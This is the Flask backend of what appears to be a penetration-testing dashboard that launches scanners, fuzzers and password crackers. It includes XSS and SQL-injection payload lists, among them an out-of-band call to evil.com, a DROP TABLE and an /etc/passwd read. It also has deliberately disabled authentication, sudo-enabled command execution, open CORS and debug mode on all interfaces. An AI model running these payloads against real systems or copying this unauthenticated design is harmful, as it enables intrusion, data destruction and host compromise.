# backend/app.py
import os
import re
import shlex
import uuid
import threading
import subprocess
import shutil
import platform
from datetime import datetime, timezone
from flask import Flask, request, jsonify, Response, stream_with_context, send_file, send_from_directory
import requests
from urllib.parse import urlparse
from flask_cors import CORS
import hashlib

# Config
RESULT_DIR = os.path.join(os.getcwd(), "results")
FRONTEND_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "frontend", "dist"))
os.makedirs(RESULT_DIR, exist_ok=True)
API_KEY = os.environ.get("API_KEY")  # optional, set in env if you want

# Global settings
USERS = {}
CURRENT_USER = None  # Store currently logged-in user

# OS-specific settings
IS_WINDOWS = platform.system() == 'Windows'
# Use WSL for better tool compatibility
# OS-specific settings
IS_WINDOWS = platform.system() == 'Windows'

def setup_python_tools():
    """Set up Python-based tools - all via pip install requirements.txt"""
    print("\n✅ Python tools configured and ready to use!")
    print("   All tools will work after: pip install -r requirements.txt")
    return True

# Run tool setup on startup
setup_python_tools()



# XSS Payloads (fixed syntax)
XSS_PAYLOADS = [
    {"name": "Basic Alert", "payload": "<script>alert('XSS')</script>"},
    {"name": "Image Onerror", "payload": "<img src=x onerror=alert('XSS')>"},
    {"name": "SVG Animation", "payload": "<svg/onload=alert('XSS')>"},
    {"name": "Body Onload", "payload": "<body onload=alert('XSS')>"},
    {"name": "Iframe Src", "payload": "<iframe src='javascript:alert(`XSS`)'></iframe>"},
    {"name": "Input Autofocus", "payload": "<input autofocus onfocus=alert('XSS')>"},
    {"name": "Video Tag", "payload": "<video><source onerror=alert('XSS')>"},
    {"name": "Audio Tag", "payload": "<audio src=x onerror=alert('XSS')>"},
    {"name": "Math ML", "payload": "<math><a xlink:href='javascript:alert(1)'>click</a></math>"},
    {"name": "Table Background", "payload": "<table background='javascript:alert(1)'></table>"},
    {"name": "Base Tag", "payload": "<base href='javascript:alert(1)//'>"},
    {"name": "Link Protocol", "payload": "<a href='javascript:alert(1)'>click</a>"},
    {"name": "Form Action", "payload": "<form action='javascript:alert(1)'><input type=submit></form>"},
    {"name": "Object Data", "payload": "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>"},
    {"name": "Marquee", "payload": "<marquee onstart=alert('XSS')>"},
    {"name": "XML Payload", "payload": "<?xml version='1.0' encoding='ISO-8859-1'?><xss>alert('XSS')</xss>"},
    {"name": "Iframe Srcdoc", "payload": "<iframe srcdoc='<script>alert(`XSS`)</script>'></iframe>"},
    {"name": "Button Formaction", "payload": "<button formaction='javascript:alert(1)'>click</button>"},
    {"name": "Chrome XSS", "payload": "chrome://brave/"},
    {"name": "Data URI", "payload": "data:text/html,<script>alert('XSS')</script>"},
]

# SQL Injection Payloads
SQL_PAYLOADS = [
    {"name": "Basic Union", "payload": "' UNION SELECT NULL--"},
    {"name": "Error Based", "payload": "' AND 1=convert(int,@@version)--"},
    {"name": "Time Based", "payload": "' waitfor delay '0:0:10'--"},
    {"name": "Boolean Based", "payload": "' AND 1=1--"},
    {"name": "Stack Query", "payload": "'; SELECT * FROM users--"},
    {"name": "UNION Schema", "payload": "' UNION ALL SELECT table_name,NULL FROM information_schema.tables--"},
    {"name": "Blind Boolean", "payload": "' AND substring(database(),1,1)='a'--"},
    {"name": "Out Of Band", "payload": "'; exec master..xp_dirtree '//evil.com/x'--"},
    {"name": "Second Order", "payload": "'; INSERT INTO users (user,pass) VALUES ('evil','evil')--"},
    {"name": "Batch Query", "payload": "'; DROP TABLE users--"},
    {"name": "Comment Bypass", "payload": "'/**/UNION/**/SELECT/**/password/**/FROM/**/users--"},
    {"name": "Case Bypass", "payload": "'UnIoN/***/SeLeCt PassWord FrOm Users--"},
    {"name": "URL Encode", "payload": "%27%20UNION%20SELECT%20password%20FROM%20users--"},
    {"name": "Unicode Bypass", "payload": "Ã¢â‚¬â„¢ UNION SELECT password FROM users--"},
    {"name": "Concatenation", "payload": "'+'UNION'+'SELECT'+'password'+'FROM'+'users--"},
    {"name": "Type Juggling", "payload": "' AND '1'='1"},
    {"name": "Order By", "payload": "' ORDER BY 1--"},
    {"name": "Having By", "payload": "' HAVING 1=1--"},
    {"name": "Group By", "payload": "' GROUP BY 1--"},
    {"name": "Load File", "payload": "' UNION ALL SELECT LOAD_FILE('/etc/passwd')--"},
]

DOWNLOAD_URLS = {
    'Windows': {
        'nmap': 'wsl sudo apt-get install -y nmap',
        'masscan': 'wsl sudo apt-get install -y masscan',
        'gobuster': 'wsl sudo apt-get install -y gobuster',
        'john': 'wsl sudo apt-get install -y john',
        'hashcat': 'wsl sudo apt-get install -y hashcat',
        'ffuf': 'wsl sudo apt-get install -y ffuf',
        'sqlmap': 'wsl sudo apt-get install -y sqlmap',
        'nikto': 'wsl sudo apt-get install -y nikto',
        'wfuzz': 'wsl sudo apt-get install -y wfuzz',
        'amass': 'wsl sudo apt-get install -y amass',
        'gospider': 'wsl sudo apt-get install -y gospider',
        'whois': 'wsl sudo apt-get install -y whois'
    },
    'Linux': {
        'nmap': 'sudo apt-get install -y nmap',
        'masscan': 'sudo apt-get install -y masscan',
        'gobuster': 'sudo apt-get install -y gobuster',
        'john': 'sudo apt-get install -y john',
        'hashcat': 'sudo apt-get install -y hashcat',
        'ffuf': 'sudo apt-get install -y ffuf',
        'sqlmap': 'sudo apt-get install -y sqlmap',
        'nikto': 'sudo apt-get install -y nikto',
        'wfuzz': 'sudo apt-get install -y wfuzz',
        'amass': 'sudo apt-get install -y amass',
        'gospider': 'sudo apt-get install -y gospider',
        'whois': 'sudo apt-get install -y whois'
    }
}

app = Flask(__name__, static_folder=None)  # We'll handle static files manually
CORS(app)  # allow local dev; tighten in production
JOBS = {}  # job_id -> metadata

# Workspace root (one level up from backend folder)
WORKSPACE_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))

# ----------- Tool categories and installation info -----------
TOOL_INFO = {
    # Network Tools
    "nmap": {
        "cmd": ["nmap"],
        "install": "Install from https://nmap.org/download.html",
        "desc": "Network scanner and security auditing tool",
        "category": "network"
    },
    "masscan": {
        "cmd": ["masscan"],
        "install": "Download from https://github.com/robertdavidgraham/masscan",
        "desc": "Fast Internet port scanner",
        "category": "network"
    },
    "traceroute": {
        "cmd": ["tracert"] if os.name == 'nt' else ["traceroute"],
        "install": "Built into Windows (tracert)",
        "desc": "Network path tracing tool",
        "category": "network"
    },
    
    # Web Tools
    "httpx": {
        "cmd": ["httpx"],
        "install": "Already installed (Python package)",
        "desc": "HTTP toolkit",
        "category": "web"
    },
    "ffuf": {
        "cmd": ["ffuf"],
        "install": "Download from https://github.com/ffuf/ffuf/releases",
        "desc": "Fast web fuzzer",
        "category": "web"
    },
    "gobuster": {
        "cmd": ["gobuster"],
        "install": "Install with: go install github.com/OJ/gobuster/v3@latest",
        "desc": "Directory/file & DNS busting tool",
        "category": "web"
    },
    "sqlmap": {
        "cmd": ["sqlmap"],
        "install": "pip install sqlmap",
        "desc": "SQL injection testing tool",
        "category": "web"
    },
    "nikto": {
        "cmd": ["nikto"],
        "install": "Install from https://github.com/sullo/nikto",
        "desc": "Web server scanner",
        "category": "web"
    },
    "wfuzz": {
        "cmd": ["wfuzz"],
        "install": "pip install wfuzz",
        "desc": "Web application fuzzer",
        "category": "web"
    },
    
    # Reconnaissance Tools
    "whois": {
        "cmd": ["whois"],
        "install": "Install SysInternals Suite from Microsoft",
        "desc": "Domain registration lookup",
        "category": "recon"
    },
    "amass": {
        "cmd": ["amass"],
        "install": "Download from https://github.com/OWASP/Amass/releases",
        "desc": "Network mapping of attack surfaces",
        "category": "recon"
    },
    "subfinder": {
        "cmd": ["subfinder"],
        "install": "Install with: go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
        "desc": "Subdomain discovery tool",
        "category": "recon"
    },
    "gospider": {
        "cmd": ["gospider"],
        "install": "Install with: go install github.com/jaeles-project/gospider@latest",
        "desc": "Web spider/crawler",
        "category": "recon"
    },
    
    # Password & Hash Tools
    "john": {
        "cmd": ["john"],
        "install": "Download from https://www.openwall.com/john/",
        "desc": "Password cracker (John the Ripper)",
        "category": "password"
    },
    "hashcat": {
        "cmd": ["hashcat"],
        "install": "Download from https://hashcat.net/hashcat/",
        "desc": "Advanced password recovery",
        "category": "password"
    },
    "zip2john": {
        "cmd": ["zip2john"],
        "install": "Included with John the Ripper",
        "desc": "Convert ZIP to John format",
        "category": "password"
    },
    "rar2john": {
        "cmd": ["rar2john"],
        "install": "Included with John the Ripper",
        "desc": "Convert RAR to John format",
        "category": "password"
    }
}

# Python-based tools are available via pip install -r requirements.txt
# All tools work without native installation!

# Check if user accepted agreement
def verify_agreement():
    if not USERS:
        return jsonify({
            "error": "Agreement not accepted",
            "message": "Please enter your name and accept the agreement"
        }), 403
    return None

@app.route("/api/user", methods=["POST"])
def api_user():
    """Register or update a user's agreement"""
    data = request.json or {}
    name = data.get("name")
    if not name:
        return jsonify({"error": "Name is required"}), 400
    
    USERS[name] = {
        "agreed_at": datetime.now(timezone.utc).isoformat(),
        "last_active": datetime.now(timezone.utc).isoformat()
    }
    
    print(f"\n✅ User '{name}' registered successfully!")
    return jsonify({"success": True, "name": name})

# All tools are Python-based and available after pip install
AVAILABLE_TOOLS = {name: info["cmd"] for name, info in TOOL_INFO.items()}

SAFE_ARG_RE = re.compile(r'^[A-Za-z0-9_\-./:=&?%]+$')

# ----------- Helpers -----------
def sanitize_target(t):
    if not t:
        return None
    t = t.strip()
    if re.match(r"^https?://", t):
        p = urlparse(t)
        return p.netloc or None
    if re.match(r"^([0-9]{1,3}\.){3}[0-9]{1,3}$", t) or re.match(r"^[A-Za-z0-9\.\-]{1,253}$", t):
        return t
    return None

def save_output_text(prefix, text):
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    fn = os.path.join(RESULT_DIR, f"{prefix}_{ts}.txt")
    with open(fn, "w", encoding="utf-8") as f:
        f.write(text)
    return fn

def generate_job_record(cmd_str, meta):
    job_id = str(uuid.uuid4())
    JOBS[job_id] = {"status": "queued", "cmd": cmd_str, "meta": meta, "started": None, "out": None}
    return job_id

def build_command(tool_key, args_list):
    # Check if tool exists in our info
    tool_info = TOOL_INFO.get(tool_key)
    if not tool_info:
        return None, f"Tool '{tool_key}' not supported"
    
    # All tools are Python-based and available via pip
    base = AVAILABLE_TOOLS.get(tool_key)
    if not base:
        install_msg = tool_info.get("install", "pip install -r requirements.txt")
        return None, f"Tool '{tool_key}' not found. {install_msg}"

    # validate args
    for a in args_list:
        if not SAFE_ARG_RE.match(a):
            return None, f"Invalid argument format: {a}"

    return base + args_list, None  # Return command and error message (None if no error)

# ----------- Subprocess streaming -----------
def stream_subprocess(cmd_list, job_id=None, cwd=None):
    """Yield lines as SSE-like 'data:' frames with ANSI color support."""
    proc = None
    output_lines = []
    try:
        # Python tools run natively on all platforms
        # Use universal_newlines for text mode but preserve ANSI colors
        proc = subprocess.Popen(
            cmd_list,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=1,
            universal_newlines=True,
            cwd=cwd,
            shell=False,
            env=dict(os.environ, FORCE_COLOR="true", PYTHONUNBUFFERED="1")
        )
        
        if not proc or not proc.stdout:
            error_msg = "\x1b[31mERROR: Failed to open process output stream\x1b[0m"  # Red error
            yield f"data: {error_msg}\n\n"
            if proc and hasattr(proc, 'kill'):
                proc.kill()
            if job_id:
                fname = save_output_text(f"error_{job_id}", error_msg)
                JOBS[job_id].update({"status": "error", "out": fname})
            return

        stdout = proc.stdout
        try:
            # Buffer for partial lines
            buffer = ""
            while True:
                char = stdout.read(1)
                if not char:
                    break
                
                # Add character to buffer
                buffer += char
                
                # Send complete lines with proper terminal formatting
                if buffer.endswith('\n'):
                    # Keep ANSI color codes intact
                    yield f"data: {buffer}"
                    buffer = ""
            
            # Send any remaining partial buffer
            if buffer:
                yield f"data: {buffer}\n\n"
                
        finally:
            stdout.close()
            rc = proc.wait()
            if rc != 0:
                yield f"data: \x1b[31mProcess exited with code {rc}\x1b[0m\n\n"
            else:
                yield f"data: \x1b[32mProcess completed successfully\x1b[0m\n\n"
    except (subprocess.SubprocessError, OSError, IOError) as e:
        yield f"data: ERROR: {str(e)}\n\n"
        if proc and hasattr(proc, 'kill'):
            try:
                proc.kill()
            except:
                pass
    except Exception as e:
        yield f"data: ERROR: {str(e)}\n\n"
        if proc is not None:
            try:
                proc.kill()
            except:
                pass
        return
    except GeneratorExit:
        if proc is not None:
            try:
                proc.kill()
            except:
                pass
        raise

# ----------- API auth (disabled) -----------
# All requests are allowed by default
@app.before_request
def allow_all():
    pass  # Allow all requests without authentication

# ----------- API endpoints -----------
@app.route("/api/tools", methods=["GET"])
def api_tools():
    """List all tools and their status, organized by category."""
    tools_by_category = {
        "network": {"name": "Network Tools", "tools": []},
        "web": {"name": "Web Security", "tools": []},
        "recon": {"name": "Reconnaissance", "tools": []},
        "password": {"name": "Password & Hash Tools", "tools": []}
    }
    
    for name, info in TOOL_INFO.items():
        # All Python-based tools are always installed
        category = info.get("category", "other")

        tool_info = {
            "name": name,
            "installed": True,  # Always True - installed via pip
            "path": "Python module",
            "description": info["desc"],
            "install_instructions": "pip install -r requirements.txt"
        }

        if category in tools_by_category:
            tools_by_category[category]["tools"].append(tool_info)

    return jsonify(tools_by_category)

@app.route("/api/crack/file", methods=["POST"])
def api_crack_file():
    """Handle password cracking for files"""
    data = request.json or {}
    file_path = data.get("file")
    file_type = data.get("type", "zip")  # zip, rar, etc
    
    if not file_path or not os.path.exists(file_path):
        return jsonify({"error": "File not found"}), 400
        
    # First convert file to John format
    converter = f"{file_type}2john"
    if converter not in AVAILABLE_TOOLS:
        return jsonify({"error": f"{converter} not installed"}), 400
        
    job_id = generate_job_record(f"crack:{file_path}", {
        "type": "crack",
        "file": file_path,
        "file_type": file_type
    })
    
    # Run the conversion and cracking in a thread
    def worker():
        try:
            # Step 1: Convert file to hash
            hash_file = os.path.join(RESULT_DIR, f"{os.path.basename(file_path)}.hash")
            convert_cmd = AVAILABLE_TOOLS[converter] + [file_path]
            with open(hash_file, "w") as f:
                subprocess.run(convert_cmd, stdout=f, text=True)
            
            # Step 2: Run John on the hash
            if "john" in AVAILABLE_TOOLS:
                cmd = AVAILABLE_TOOLS["john"] + ["--wordlist=wordlists/rockyou.txt", hash_file]
                out = subprocess.run(cmd, capture_output=True, text=True)
                fname = save_output_text(f"crack_{os.path.basename(file_path)}", out.stdout)
                JOBS[job_id].update({"status": "finished", "out": fname})
            else:
                JOBS[job_id].update({"status": "error", "error": "John the Ripper not installed"})
        except Exception as e:
            JOBS[job_id].update({"status": "error", "error": str(e)})
            
    threading.Thread(target=worker, daemon=True).start()
    return jsonify({"job_id": job_id})

@app.route("/api/jobs", methods=["GET"])
def api_jobs():
    return jsonify(JOBS)

@app.route("/api/result/<job_id>", methods=["GET"])
def api_result(job_id):
    job = JOBS.get(job_id)
    if not job or not job.get("out"):
        return jsonify({"error": "result not ready"}), 404
    return send_file(job["out"], as_attachment=True, download_name=os.path.basename(job["out"]))

@app.route("/api/crtsh", methods=["POST"])
def api_crtsh():
    data = request.json or {}
    domain = sanitize_target(data.get("domain",""))
    if not domain:
        return jsonify({"error":"invalid domain"}), 400
    try:
        q = f"https://crt.sh/?q=%25{domain}&output=json"
        r = requests.get(q, timeout=15)
        if r.status_code != 200:
            return jsonify({"error":"crt.sh non-200"}), 500
        dataj = r.json()
        hosts = set()
        for item in dataj:
            name = item.get("name_value") or ""
            for h in name.splitlines():
                h = h.strip().lstrip("*.")
                if h.endswith(domain):
                    hosts.add(h)
        text = "\n".join(sorted(hosts))
        job_id = generate_job_record(f"crtsh:{domain}", {"type":"crtsh","domain":domain})
        fname = save_output_text(f"crtsh_{domain}", text)
        JOBS[job_id].update({"status":"finished", "out": fname, "started": datetime.now(timezone.utc).isoformat()})
        return jsonify({"job_id": job_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/httpcheck", methods=["POST"])
def api_httpcheck():
    data = request.json or {}
    target = sanitize_target(data.get("target",""))
    if not target:
        return jsonify({"error":"invalid target"}), 400
    url = target if target.startswith("http") else "http://" + target
    try:
        r = requests.get(url, timeout=10)
        headers = "\n".join([f"{k}: {v}" for k,v in r.headers.items()])
        text = f"Status: {r.status_code}\n\n{headers}"
        job_id = generate_job_record(f"httpcheck:{target}", {"type":"http","target":target})
        fname = save_output_text(f"http_{target}", text)
        JOBS[job_id].update({"status":"finished", "out":fname, "started": datetime.now(timezone.utc).isoformat()})
        return jsonify({"job_id": job_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/exec", methods=["POST"])
def api_exec():
    """
    POST JSON:
    { "tool": "nmap", "args": ["-sV","-p","1-1000","example.com"], "cwd": null }
    Returns: streaming text (SSE-like frames). Client should POST and read response stream.
    """
    # Check agreement
    agreement_check = verify_agreement()
    if agreement_check:
        return agreement_check
        
    data = request.json or {}
    tool = data.get("tool")
    args = data.get("args", [])
    cwd = data.get("cwd", None)

    # Support commands prefixed with 'sudo' from the frontend (e.g. "sudo nmap -p 1-100 example.com").
    # Frontend sends the first token as `tool`; if it's 'sudo', extract the real tool from args.
    use_sudo = False
    real_tool = tool
    if tool == 'sudo':
        if not args:
            return jsonify({"error": "Missing command after sudo"}), 400
        real_tool = args[0]
        args = args[1:]
        use_sudo = True

    # Check if tool is allowed and available
    if not real_tool or real_tool not in AVAILABLE_TOOLS:
        available = ', '.join(sorted(AVAILABLE_TOOLS.keys()))
        return jsonify({"error": f"Tool not allowed. Available tools: {available}"}), 400

    cmd, error = build_command(real_tool, args)
    if error:
        return jsonify({"error": error}), 400
    if not cmd:
        return jsonify({"error": "Failed to build command"}), 400

    # If sudo was requested, prepend it on non-Windows platforms.
    if use_sudo:
        if IS_WINDOWS:
            return jsonify({"error": "'sudo' is not supported on Windows hosts. Run the server on a Unix-like host or omit sudo."}), 400
        # If sudo is available, prefer system sudo; otherwise the subprocess will fail and report it.
        cmd = ['sudo'] + cmd

    # Create job record with full command string
    cmd_str = ' '.join(str(x) for x in cmd)
    job_id = generate_job_record(cmd_str, {"type": "exec", "tool": tool, "args": args})
    JOBS[job_id].update({"status":"running", "started": datetime.now(timezone.utc).isoformat()})
    # stream response directly and capture output
    def process_output():
        output_lines = []
        # Send command as first line in cyan
        cmd_str = " ".join(cmd)
        yield f"data: \x1b[36m$ {cmd_str}\x1b[0m\n\n"
        
        for line in stream_subprocess(cmd, job_id=job_id, cwd=cwd):
            # Store raw output without ANSI codes for file
            clean_line = line.replace("data: ", "", 1).rstrip("\n\n")
            # Remove ANSI codes for file storage
            clean_line = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', clean_line)
            output_lines.append(clean_line)
            # Forward the line with colors intact
            yield line
            
        # Save complete output when done
        if output_lines:
            fname = save_output_text(f"{tool}_{job_id}", "\n".join(output_lines))
            JOBS[job_id].update({"status": "finished", "out": fname})
            # Send completion message in green
            yield f"data: \x1b[32mCommand completed successfully\x1b[0m\n\n"
        else:
            JOBS[job_id].update({"status": "error"})
            # Send error message in red
            yield f"data: \x1b[31mCommand failed - no output\x1b[0m\n\n"
            
    return Response(stream_with_context(process_output()), mimetype="text/event-stream")

@app.route("/api/fuzz", methods=["POST"])
def api_fuzz():
    # convenience: call ffuf/gobuster or fallback to python fuzz implemented here
    data = request.json or {}
    target = sanitize_target(data.get("target",""))
    wordlist = data.get("wordlist","wordlists/common.txt")
    threads = int(data.get("threads",10))
    if not target:
        return jsonify({"error":"invalid target"}), 400

    # prefer ffuf (use system path check)
    if shutil.which("ffuf"):
        cmd = ["ffuf", "-u", f"http://{target}/FUZZ", "-w", wordlist, "-t", str(threads)]
        job_id = generate_job_record(" ".join(cmd), {"type":"fuzz","tool":"ffuf","target":target})
        def worker():
            out = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            fname = save_output_text(f"ffuf_{target}", out.stdout)
            JOBS[job_id].update({"status":"finished","out":fname})
        threading.Thread(target=worker, daemon=True).start()
        return jsonify({"job_id": job_id})

    # python fallback fuzz (non-parallel)
    job_id = generate_job_record("pyfuzz", {"type":"fuzz","tool":"pyfuzz","target":target})
    def worker_py():
        out_lines=[]
        try:
            if not os.path.exists(wordlist):
                out_lines.append("Wordlist not found: " + wordlist)
            else:
                with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
                    words=[w.strip() for w in f if w.strip()]
                for w in words[:2000]:
                    try:
                        r = requests.get(f"http://{target}/{w}", timeout=5, allow_redirects=False)
                        if r.status_code < 400:
                            out_lines.append(f"{w} -> {r.status_code}")
                    except:
                        pass
            fname = save_output_text(f"pyfuzz_{target}", "\n".join(out_lines))
            JOBS[job_id].update({"status":"finished","out":fname})
        except Exception as e:
            fname = save_output_text(f"pyfuzz_err_{target}", str(e))
            JOBS[job_id].update({"status":"finished","out":fname})
    threading.Thread(target=worker_py, daemon=True).start()
    return jsonify({"job_id": job_id})

# ----------- File management endpoints -----------
@app.route('/api/files', methods=['GET'])
def api_files():
    """List files and directories under a given directory (relative to workspace)."""
    rel = request.args.get('dir', '.')
    # Prevent path traversal
    target = os.path.abspath(os.path.join(WORKSPACE_ROOT, rel))
    if not target.startswith(WORKSPACE_ROOT):
        return jsonify({'error': 'invalid path'}), 400
    if not os.path.exists(target):
        return jsonify({'error': 'not found'}), 404
    items = []
    try:
        for name in sorted(os.listdir(target)):
            full = os.path.join(target, name)
            try:
                stat = os.stat(full)
                items.append({
                    'name': name,
                    'path': os.path.relpath(full, WORKSPACE_ROOT),
                    'is_dir': os.path.isdir(full),
                    'size': stat.st_size,
                    'mtime': int(stat.st_mtime)
                })
            except Exception:
                pass
        return jsonify({'path': os.path.relpath(target, WORKSPACE_ROOT), 'items': items})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/delete', methods=['POST'])
def api_delete():
    data = request.json or {}
    rel = data.get('path')
    if not rel:
        return jsonify({'error': 'missing path'}), 400
    target = os.path.abspath(os.path.join(WORKSPACE_ROOT, rel))
    if not target.startswith(WORKSPACE_ROOT):
        return jsonify({'error': 'invalid path'}), 400
    if not os.path.exists(target):
        return jsonify({'error': 'not found'}), 404
    # Only allow file deletion by default
    try:
        if os.path.isdir(target):
            # require explicit recursive flag
            if not data.get('recursive'):
                return jsonify({'error': 'path is a directory; set recursive=true to delete'}), 400
            # Do not allow deleting workspace root
            if os.path.abspath(target) == WORKSPACE_ROOT:
                return jsonify({'error': 'refuse to delete workspace root'}), 400
            shutil.rmtree(target)
            return jsonify({'ok': True})
        else:
            os.remove(target)
            return jsonify({'ok': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/duplicates', methods=['GET'])
def api_duplicates():
    """Find duplicate files under workspace by SHA256 hash."""
    groups = {}
    try:
        for root, dirs, files in os.walk(WORKSPACE_ROOT):
            # skip .git and node_modules for speed
            if '.git' in root or 'node_modules' in root:
                continue
            for f in files:
                full = os.path.join(root, f)
                try:
                    # small files first; compute hash in chunks
                    h = hashlib.sha256()
                    with open(full, 'rb') as fh:
                        while True:
                            chunk = fh.read(8192)
                            if not chunk: break
                            h.update(chunk)
                    digest = h.hexdigest()
                    groups.setdefault(digest, []).append(os.path.relpath(full, WORKSPACE_ROOT))
                except Exception:
                    pass
        # keep only duplicates
        dups = [v for v in groups.values() if len(v) > 1]
        return jsonify({'duplicates': dups})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Serve frontend static files
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve_frontend(path):
    # Don't interfere with API routes
    if path.startswith('api/'):
        return jsonify({"error": "Not found"}), 404
        
    # Try to serve the requested file
    if path:
        try:
            return send_from_directory(FRONTEND_DIR, path)
        except:
            pass
            
    # Default to index.html (or dev fallback) for all other routes (SPA behavior)
    try:
        # prefer dev fallback if present
        dev_file = os.path.join(FRONTEND_DIR, 'index.dev.html')
        if os.path.exists(dev_file):
            return send_from_directory(FRONTEND_DIR, 'index.dev.html')
        return send_from_directory(FRONTEND_DIR, 'index.html')
    except Exception as e:
        print(f"Error serving frontend: {str(e)}")
        print(f"Frontend directory: {FRONTEND_DIR}")
        return f"Error serving frontend. Directory: {FRONTEND_DIR}", 500

if __name__ == "__main__":
    # run dev server
    port = int(os.environ.get("PORT", 5000))
    print(f"Server running on http://localhost:{port}")
    print(f"Frontend directory: {FRONTEND_DIR}")
    app.run(host="0.0.0.0", port=port, debug=True)
